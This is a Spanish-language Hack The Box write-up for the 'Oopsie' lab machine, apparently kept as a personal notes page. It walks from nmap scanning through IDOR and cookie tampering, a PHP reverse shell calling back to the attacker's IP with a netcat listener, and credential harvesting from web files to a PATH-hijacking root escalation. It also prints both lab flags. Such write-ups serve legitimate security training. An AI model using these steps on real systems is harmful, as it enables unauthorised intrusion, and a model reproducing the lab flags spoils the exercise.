---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/starting-point
dificultad: Fácil
os: Linux
relacionados:
  - "[[PATH Hijacking]]"
  - "[[gobuster]]"
  - "[[BOLA - IDOR]]"
  - "[[Manipulación de Cookies]]"
---
# HackTheBox - Oopsie

## Reconocimiento

### Escaneo Inicial

Comienzo con un escaneo de puertos y servicios utilizando `nmap` para identificar los servicios disponibles en la máquina objetivo.

- Escaneo de todos los puertos:
    ```bash
    nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn [IP_victima] -oG nmap/allports
    ```

- Escaneo específico de servicios:
    ```bash
    nmap -sCV -p22,80 [IP_victima] -oN nmap/target
    ```

**Resultados:**
- **22/tcp**: OpenSSH 7.6p1 Ubuntu.a
- **80/tcp**: Apache httpd 2.4.29.

Es una buena práctica centrarse inicialmente en los servicios web, ya que suelen ser puntos de entrada comunes debido a la amplia superficie de ataque que presentan.

### Enumeración del Sitio Web

Accedo al sitio web en `http://10.129.206.47/`. La página parece estática y al interactuar con ella, solo agrega un `#` a la URL sin cambios visibles en el contenido.

#### Análisis del Código Fuente

Al inspeccionar el código fuente de la página, encuentro un comentario que sugiere una URL de inicio de sesión:

```html
/cdn-cgi/login/
```

#### Acceso al Formulario de Login

Visito `http://10.129.206.47/cdn-cgi/login/` y encuentro una página de inicio de sesión personalizada. Intento iniciar sesión con credenciales comunes sin éxito, pero noto que hay una opción para ingresar como **invitado**.

---

## Análisis de Vulnerabilidades

### Manipulación de Parámetros ([[BOLA - IDOR]])

Una vez iniciado como invitado, observo que la URL incluye un parámetro `id=2`. Al cambiar este valor a `id=1`, accedo a la información del usuario administrador. Esto indica una vulnerabilidad de **Insecure Direct Object Reference (IDOR)**, donde puedo acceder a recursos sin la autorización adecuada.

### [[Manipulación de Cookies]]

Inspeccionando las cookies en el navegador, encuentro una llamada `role` con valor `guest`. Si cambio este valor a `admin`, obtengo privilegios administrativos en la aplicación, lo que me permite acceder a funcionalidades adicionales como la sección de **carga de archivos**.

---

## Explotación de Vulnerabilidades

### Carga de una Reverse Shell

Aprovechando la funcionalidad de carga de archivos y sabiendo que el servidor ejecuta PHP, intento subir una **reverse shell** para obtener acceso al sistema.

#### Preparación de la Reverse Shell

Utilizo la reverse shell en PHP disponible en Kali Linux:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Edito el archivo para configurar mi dirección IP y puerto de escucha:
```php
$ip = '10.10.14.51';  // Mi IP
$port = 4444;         // Puerto que usaré para la conexión
```

#### Subida del Archivo Malicioso

Subo `php-reverse-shell.php` a través de la interfaz de carga de archivos de la aplicación web.

### Descubrimiento de la Ubicación del Archivo

Utilizo **Gobuster** para enumerar directorios y encontrar dónde se almacenan los archivos subidos:
```bash
gobuster dir -u http://[ip] -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Encuentro el directorio `/uploads/`, donde presumiblemente se almacena mi archivo.

### Establecimiento de la Reverse Shell

En mi máquina atacante, inicio un listener en el puerto especificado:
```bash
nc -lvnp 4444
```

Luego, visito `http://10.129.206.47/uploads/php-reverse-shell.php` para activar la shell inversa. Obtengo una conexión como el usuario `www-data`.

#### Mejora de la Interactividad de la Shell

Para mejorar la funcionalidad de la shell, ejecuto:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Esto me proporciona un entorno de shell más estable y funcional.

---

## Escalada de Privilegios

### Enumeración del Sistema

Como `www-data`, exploro el sistema en busca de información útil.

#### Identificación de Usuarios

Listado los usuarios con shell válida:
```bash
cat /etc/passwd | grep '/bin/bash'
```
Encuentro al usuario `robert`.

##### Obtención flag de usuario

Pruebo de entrar a su directorio.
```bash
cd /home/robert
```

Entra y me encuentro con una flag ahí:
```bash
cat user.txt
```
```
f2c74ee8db7983851ab2a96a44eb7981
```

#### Búsqueda de Credenciales

Busco archivos que puedan contener credenciales y encuentro varios interesantes en la ruta `/var/www/html/`
```bash
grep -Ri "password" /var/www/html/
```

Encuentro en `db.php` las credenciales para `robert`:
```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

### Acceso como `robert`

Uso las credenciales para cambiar al usuario `robert`:
```bash
su robert
```

Ingreso la contraseña `M3g4C0rpUs3r!`.

### Enumeración de Privilegios

Como `robert`, verifico los permisos de sudo:
```bash
sudo -l
```
No tengo permisos de sudo. 

Veo los grupos:
```bash
id
```
```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Veo que `robert` pertenece al grupo `bugtracker`.

#### Exploración de Archivos con SUID

Busco archivos con el bit SUID establecido y pertenecientes al grupo `bugtracker`:
```bash
find / -perm -4000 -group bugtracker 2>/dev/null
```

Encuentro `/usr/bin/bugtracker`.

#### Análisis del Binario `bugtracker`

Observo los permisos:
```bash
ls -l /usr/bin/bugtracker
```
```bash
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

El binario tiene el bit SUID y es propiedad de root, lo que significa que se ejecuta con privilegios elevados.

### Explotación de `bugtracker`

Al ejecutar el binario, solicita un **Bug ID** y luego intenta leer un archivo en `/root/reports/<Bug ID>`.

Si le paso un ls:
```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ls
pwd
---------------

cat: /root/reports/pwd: No such file or directory

```

Si le paso un pwd
```
------------------
: EV Bug Tracker :
------------------

Provide Bug ID: pwd
pwd
---------------

cat: /root/reports/pwd: No such file or directory
```

#### [[PATH Hijacking]]

Noto que el programa utiliza el comando `cat` sin especificar la ruta completa. Puedo aprovechar esto creando mi propia versión de `cat` que me proporcione una shell con privilegios elevados.

##### Paso a Paso:

1. **Crear un script malicioso de `cat` en `/tmp`:**
   ```bash
   echo '#!/bin/bash' > /tmp/cat
   echo '/bin/bash' >> /tmp/cat
   chmod +x /tmp/cat
   ```

2. **Modificar la variable `PATH` para priorizar `/tmp`:**
   ```bash
   export PATH=/tmp:$PATH
   ```

3. **Ejecutar `/usr/bin/bugtracker`:**
   ```bash
   /usr/bin/bugtracker
   ```

   Al ingresar cualquier `Bug ID`, el programa intentará ejecutar mi script `cat`, otorgándome una shell con privilegios de root.

###### Obtención de la Flag Root

Con la shell elevada, accede al directorio `/root` y leo la flag:
```bash
/bin/cat root.txt
```
```
af13b0bee69f8a877c3faf667f7beacf
```

---
## Bandera(s)

> [!FLAG] **Bandera de Usuario**
> f2c74ee8db7983851ab2a96a44eb7981
^bandera

> [!FLAG] **Bandera de Root**
> af13b0bee69f8a877c3faf667f7beacf
^bandera
